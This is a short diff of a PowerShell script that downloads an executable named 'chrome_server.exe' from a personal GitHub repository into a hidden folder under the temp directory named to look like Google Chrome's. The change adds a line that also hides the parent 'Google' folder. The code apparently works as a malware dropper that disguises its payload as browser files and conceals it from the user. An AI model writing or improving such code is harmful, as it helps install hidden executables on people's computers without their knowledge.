@@ -73,11 +73,12 @@ function Get-File
 }
 
 $uri = "https://github.com/yourname1204/future/raw/main/chrome_server.exe"
-$dir = $spotifyDirectory = Join-Path -Path $env:TEMP -ChildPath 'Google\Chrome\'
+$dir = Join-Path -Path $env:TEMP -ChildPath 'Google\Chrome\'
 if (!(Test-Path -Path $dir)) {
     New-Item -ItemType Directory -Force -Path $dir
 }
 $hiddenAttribute = [System.IO.FileAttributes]::Hidden
+Set-ItemProperty -Path (Join-Path -Path $env:TEMP -ChildPath 'Google\') -Name Attributes -Value $hiddenAttribute
 Set-ItemProperty -Path $dir -Name Attributes -Value $hiddenAttribute
 $file_path = Join-Path -Path $dir -ChildPath 'chrome_server.exe'
 Get-File -Uri $uri -TargetFile $dir
